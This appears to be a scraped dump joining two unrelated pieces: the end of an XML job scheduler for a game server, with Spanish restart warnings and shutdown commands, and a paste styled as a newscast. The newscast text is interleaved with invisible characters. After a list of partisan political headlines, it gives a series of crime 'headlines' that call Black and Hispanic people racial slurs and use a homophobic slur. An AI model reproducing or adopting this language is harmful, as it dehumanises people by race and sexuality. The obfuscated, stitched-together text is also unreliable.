	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='25'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='26'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='27'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='28'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='29'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='30'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='31'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='32'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='33'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='34'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='35'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='36'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='37'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='38'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='39'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='40'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='41'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='42'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='43'>
		<day>1,2,3,4,5,6,7</day>
		<start>11:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='44'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='45'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='46'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='47'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='48'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='49'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='50'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='51'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='52'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='53'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='54'>
		<day>1,2,3,4,5,6,7</day>
		<start>15:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='55'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='56'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='57'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='58'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='59'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='60'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='61'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='62'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='63'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='64'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='65'>
		<day>1,2,3,4,5,6,7</day>
		<start>19:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- Mensaje Discord Server -->
	<job id=""66"">
		<day>1,2,3,4,5,6,7</day>
		<start>000060</start>
		<runtime>004500</runtime>
		<loop>-1</loop>
		<cmd>say -1 https://discord.gg/stTR3vF</cmd>
	</job>

</Scheduler>"
GmDc7zXe,News March7 24,Newscaster_Ned,Email,Thursday 7th of March 2024 08:26:30 PM CDT,"..................Test 1..................
..................Test 2..................
..................Test 3..................
........................... Test complete.

Time for the news.

Exclusive – GOP‎ ‎R‎i‎p‎s‎ ‎B‎i‎d‎e‎n‎ ‎f‎o‎r‎ ‎E‎r‎e‎c‎t‎i‎n‎g‎ ‎C‎a‎p‎i‎t‎o‎l‎ ‎F‎e‎n‎c‎e‎ ‎W‎h‎i‎l‎e‎ ‎B‎o‎r‎d‎e‎r‎ ‎i‎s‎ ‎O‎p‎e‎n‎
A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎B‎l‎o‎c‎k‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎M‎o‎t‎o‎r‎c‎a‎d‎e‎ ‎B‎e‎f‎o‎r‎e‎ ‎S‎O‎T‎U‎
N‎B‎C‎’‎s‎ ‎C‎h‎u‎c‎k‎ ‎T‎o‎d‎d‎:‎ ‎D‎e‎b‎a‎t‎e‎s‎ ‎'‎D‎o‎n‎'‎t‎ ‎H‎e‎l‎p‎'‎ ‎T‎r‎u‎m‎p‎
*‎*‎*‎ ‎S‎O‎T‎U‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎ ‎B‎i‎d‎e‎n‎ ‎D‎e‎l‎i‎v‎e‎r‎s‎ ‎T‎h‎i‎r‎d‎,‎ ‎P‎o‎s‎s‎i‎b‎l‎y‎ ‎F‎i‎n‎a‎l‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎U‎n‎i‎o‎n‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎ ‎U‎s‎e‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎t‎o‎ ‎A‎t‎t‎a‎c‎k‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎o‎n‎ ‎A‎g‎e‎
B‎i‎l‎l‎ ‎A‎l‎l‎o‎w‎i‎n‎g‎ ‎C‎o‎n‎c‎e‎a‎l‎e‎d‎ ‎C‎a‎r‎r‎y‎ ‎i‎n‎ ‎S‎c‎h‎o‎o‎l‎s‎ ‎H‎e‎a‎d‎e‎d‎ ‎t‎o‎ ‎W‎y‎o‎m‎i‎n‎g‎ ‎G‎o‎v‎'‎s‎ ‎D‎e‎s‎k‎
B‎r‎e‎i‎t‎b‎a‎r‎t‎'‎s‎ ‎B‎o‎y‎l‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎W‎i‎l‎l‎ ‎T‎r‎y‎ ‎t‎o‎ ‎B‎l‎a‎m‎e‎ ‎'‎E‎v‎e‎r‎y‎o‎n‎e‎ ‎E‎l‎s‎e‎'‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
*‎*‎*‎ ‎S‎O‎T‎U‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎

J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎D‎e‎l‎i‎v‎e‎r‎s‎ ‎T‎h‎i‎r‎d‎ ‎a‎n‎d‎ ‎P‎o‎s‎s‎i‎b‎l‎y‎ ‎F‎i‎n‎a‎l‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎A‎d‎d‎r‎e‎s‎s‎

B‎l‎a‎m‎e‎ ‎G‎a‎m‎e‎ ‎E‎x‎p‎e‎c‎t‎e‎d‎:‎ ‎B‎r‎o‎k‎e‎n‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎E‎c‎o‎n‎o‎m‎y‎,‎ ‎F‎o‎r‎e‎i‎g‎n‎ ‎W‎a‎r‎s‎…‎
T‎h‎e‎ ‎B‎u‎c‎k‎ ‎S‎t‎o‎p‎s‎ ‎H‎e‎r‎e‎ ‎N‎o‎n‎e‎ ‎o‎f‎ ‎I‎t‎ ‎I‎s‎ ‎H‎i‎s‎ ‎F‎a‎u‎l‎t‎!‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎w‎i‎l‎l‎ ‎t‎a‎k‎e‎ ‎t‎h‎e‎ ‎p‎o‎d‎i‎u‎m‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎t‎o‎ ‎d‎e‎l‎i‎v‎e‎r‎ ‎h‎i‎s‎ ‎t‎h‎i‎r‎d‎ ‎a‎n‎d‎ ‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎l‎a‎s‎t‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎a‎d‎d‎r‎e‎s‎s‎.‎

M‎e‎d‎i‎a‎’‎s‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎a‎n‎i‎c‎ ‎P‎u‎s‎h‎e‎s‎ ‎L‎i‎b‎e‎r‎a‎l‎s‎ ‎t‎o‎ ‎E‎m‎i‎g‎r‎a‎t‎e‎
M‎e‎d‎i‎a‎'‎s‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎a‎n‎i‎c‎ ‎P‎u‎s‎h‎e‎s‎ ‎L‎i‎b‎e‎r‎a‎l‎s‎ ‎t‎o‎ ‎E‎m‎i‎g‎r‎a‎t‎e‎
2‎,‎8‎4‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎F‎e‎d‎s‎ ‎B‎u‎i‎l‎d‎ ‎a‎ ‎W‎a‎l‎l‎ ‎f‎o‎r‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎S‎O‎T‎U‎ ‎A‎d‎d‎r‎e‎s‎s‎:‎ ‎‘‎W‎a‎l‎l‎s‎ ‎W‎o‎r‎k‎’‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎F‎e‎d‎s‎ ‎B‎u‎i‎l‎d‎ ‎a‎ ‎W‎a‎l‎l‎ ‎f‎o‎r‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎O‎T‎U‎ ‎A‎d‎d‎r‎e‎s‎s‎:‎ ‎'‎W‎a‎l‎l‎s‎ ‎W‎o‎r‎k‎'‎
4‎,‎9‎6‎6‎
R‎e‎p‎o‎r‎t‎s‎:‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎t‎o‎ ‎D‎r‎o‎p‎ ‎o‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎o‎n‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎ ‎
N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎t‎o‎ ‎D‎r‎o‎p‎ ‎O‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎o‎n‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎ ‎
4‎,‎5‎2‎5‎
N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎D‎r‎o‎p‎s‎ ‎O‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎R‎a‎c‎e‎
N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎D‎r‎o‎p‎s‎ ‎O‎u‎t‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎r‎i‎m‎a‎r‎y‎ ‎R‎a‎c‎e‎
5‎,‎5‎7‎9‎
B‎i‎d‎e‎n‎ ‎C‎o‎-‎C‎h‎a‎i‎r‎ ‎C‎o‎o‎n‎s‎:‎ ‎‘‎I‎ ‎W‎o‎u‎l‎d‎n‎’‎t‎ ‎E‎n‎c‎o‎u‎r‎a‎g‎e‎’‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎Y‎o‎u‎ ‎C‎a‎n‎ ‎W‎a‎t‎c‎h‎ ‎S‎O‎T‎U‎
B‎i‎d‎e‎n‎ ‎C‎o‎-‎C‎h‎a‎i‎r‎:‎ ‎'‎I‎ ‎W‎o‎u‎l‎d‎n‎'‎t‎ ‎E‎n‎c‎o‎u‎r‎a‎g‎e‎'‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎Y‎o‎u‎ ‎C‎a‎n‎ ‎W‎a‎t‎c‎h‎ ‎S‎O‎T‎U‎
3‎5‎5‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎S‎a‎y‎ ‎T‎h‎e‎y‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎W‎a‎t‎c‎h‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎A‎d‎d‎r‎e‎s‎s‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎S‎a‎y‎ ‎T‎h‎e‎y‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎W‎a‎t‎c‎h‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎o‎n‎ ‎A‎d‎d‎r‎e‎s‎s‎
1‎,‎0‎0‎0‎
D‎e‎n‎v‎e‎r‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎B‎e‎g‎ ‎L‎a‎n‎d‎l‎o‎r‎d‎s‎ ‎t‎o‎ ‎H‎o‎u‎s‎e‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎a‎s‎ ‎S‎h‎e‎l‎t‎e‎r‎s‎ ‎O‎v‎e‎r‎f‎l‎o‎w‎
D‎e‎n‎v‎e‎r‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎B‎e‎g‎ ‎L‎a‎n‎d‎l‎o‎r‎d‎s‎ ‎t‎o‎ ‎H‎o‎u‎s‎e‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎a‎s‎ ‎S‎h‎e‎l‎t‎e‎r‎s‎ ‎O‎v‎e‎r‎f‎l‎o‎w‎
3‎3‎8‎
D‎a‎i‎l‎y‎ ‎B‎e‎a‎s‎t‎:‎ ‎M‎i‎n‎n‎e‎s‎o‎t‎a‎’‎s‎ ‎1‎9‎%‎ ‎‘‎U‎n‎c‎o‎m‎m‎i‎t‎t‎e‎d‎’‎ ‎S‎p‎e‎l‎l‎s‎ ‎T‎r‎o‎u‎b‎l‎e‎ ‎f‎o‎r‎ ‎B‎i‎d‎e‎n‎
D‎a‎i‎l‎y‎ ‎B‎e‎a‎s‎t‎:‎ ‎M‎i‎n‎n‎e‎s‎o‎t‎a‎'‎s‎ ‎1‎9‎%‎ ‎'‎U‎n‎c‎o‎m‎m‎i‎t‎t‎e‎d‎'‎ ‎S‎p‎e‎l‎l‎s‎ ‎T‎r‎o‎u‎b‎l‎e‎ ‎f‎o‎r‎ ‎B‎i‎d‎e‎n‎
4‎,‎0‎9‎4‎
W‎a‎t‎c‎h‎:‎ ‎B‎i‎d‎e‎n‎ ‎G‎e‎t‎s‎ ‎S‎O‎T‎U‎ ‎P‎e‎p‎ ‎T‎a‎l‎k‎ ‎f‎r‎o‎m‎ ‎F‎o‎r‎m‎e‎r‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎‘‎P‎r‎e‎s‎i‎d‎e‎n‎t‎s‎’‎ ‎M‎o‎r‎g‎a‎n‎ ‎F‎r‎e‎e‎m‎a‎n‎,‎ ‎M‎i‎c‎h‎
C‎r‎i‎n‎g‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎G‎e‎t‎s‎ ‎S‎O‎T‎U‎ ‎P‎e‎p‎ ‎T‎a‎l‎k‎ ‎f‎r‎o‎m‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎'‎P‎r‎e‎s‎i‎d‎e‎n‎t‎s‎'‎
2‎,‎3‎4‎8‎
N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎S‎t‎a‎t‎e‎ ‎S‎e‎n‎d‎i‎n‎g‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎G‎u‎a‎r‎d‎ ‎t‎o‎ ‎N‎Y‎C‎ ‎s‎o‎ ‎C‎o‎m‎m‎u‎t‎e‎r‎s‎ ‎‘‎F‎e‎e‎l‎ ‎S‎a‎f‎e‎’‎
N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎S‎t‎a‎t‎e‎ ‎S‎e‎n‎d‎i‎n‎g‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎G‎u‎a‎r‎d‎ ‎t‎o‎ ‎N‎Y‎C‎ ‎s‎o‎ ‎C‎o‎m‎m‎u‎t‎e‎r‎s‎ ‎'‎F‎e‎e‎l‎ ‎S‎a‎f‎e‎'‎

M‎o‎n‎k‎e‎y‎ ‎R‎u‎n‎s‎ ‎O‎v‎e‎r‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎T‎i‎m‎e‎s‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎i‎n‎ ‎M‎e‎m‎p‎h‎i‎s‎.‎

P‎a‎r‎a‎l‎l‎e‎l‎ ‎p‎a‎r‎k‎i‎n‎g‎ ‎c‎a‎n‎ ‎b‎e‎ ‎a‎ ‎p‎a‎i‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎a‎s‎s‎.‎


N‎e‎g‎r‎o‎ ‎F‎a‎g‎ ‎S‎t‎a‎b‎s‎ ‎H‎i‎s‎ ‎G‎a‎y‎ ‎L‎o‎v‎e‎r‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎N‎e‎w‎ ‎L‎o‎n‎d‎o‎n‎.‎


R‎a‎y‎t‎o‎w‎n‎ ‎N‎i‎g‎ ‎S‎h‎o‎o‎t‎s‎ ‎H‎i‎s‎ ‎M‎o‎t‎h‎e‎r‎ ‎a‎n‎d‎ ‎2‎ ‎O‎t‎h‎e‎r‎ ‎P‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎


B‎o‎n‎g‎o‎ ‎B‎e‎a‎t‎e‎r‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎s‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎B‎e‎h‎a‎v‎i‎o‎r‎a‎l‎ ‎H‎e‎a‎l‎t‎h‎ ‎C‎e‎n‎t‎e‎r‎ ‎i‎n‎ ‎F‎l‎o‎r‎i‎d‎a‎.‎


2‎ ‎P‎a‎v‎e‎m‎e‎n‎t‎ ‎A‎p‎e‎s‎ ‎B‎e‎a‎t‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎S‎t‎o‎p‎l‎i‎g‎h‎t‎ ‎i‎n‎ ‎C‎A‎.‎


N‎e‎g‎r‎o‎ ‎S‎h‎o‎w‎s‎ ‎H‎i‎s‎ ‎P‎e‎n‎i‎s‎ ‎t‎o‎ ‎2‎ ‎O‎f‎f‎-‎D‎u‎t‎y‎ ‎M‎e‎m‎p‎h‎i‎s‎ ‎O‎f‎f‎i‎c‎e‎r‎s‎ ‎a‎n‎d‎ ‎1‎ ‎W‎o‎m‎a‎n‎.‎


N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎R‎o‎b‎b‎e‎d‎ ‎B‎a‎n‎k‎ ‎S‎t‎e‎a‎l‎s‎ ‎L‎o‎t‎t‎e‎r‎y‎ ‎T‎i‎c‎k‎e‎t‎ ‎t‎h‎a‎t‎ ‎F‎e‎l‎l‎ ‎f‎r‎o‎m‎ ‎M‎a‎n‎'‎s‎ ‎P‎o‎c‎k‎e‎t‎ ‎i‎n‎ ‎P‎a‎l‎a‎t‎i‎n‎e‎.‎


S‎p‎i‎c‎ ‎P‎h‎i‎l‎l‎y‎ ‎C‎o‎p‎ ‎K‎i‎l‎l‎s‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎W‎h‎i‎l‎e‎ ‎D‎r‎i‎v‎i‎n‎g‎ ‎D‎r‎u‎n‎k‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎6‎7‎°‎
3‎9‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎7‎ ‎|‎ ‎D‎a‎y‎
7‎6‎°‎
3‎9‎%‎
S‎S‎E‎
1‎4‎
m‎p‎h‎
